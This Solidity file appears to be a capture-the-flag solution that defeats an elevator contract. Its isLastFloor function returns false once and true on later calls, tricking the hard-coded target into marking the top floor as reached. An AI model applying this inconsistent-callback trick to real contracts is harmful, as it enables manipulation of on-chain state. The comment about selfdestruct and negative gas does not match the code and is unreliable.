// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {IBuilding} from "./interfaces/IBuilding.sol";

contract Building is IBuilding {
    address public elevator = 0x3418fE95da630bd77D02d00127C3d3E5E22019Cb;
    uint256 public count = 0;

    //destruct and send left-over to the target address, selfdestruct opcode use a negative gas
    function goTo() external {
        bytes memory callData = abi.encodeWithSignature("goTo(uint256)", 1);
        elevator.call(callData);
    }

    function isLastFloor(uint256) external returns (bool) {
        if (count == 0) {
            count++;
            return false;
        }
        return true;
    }
}
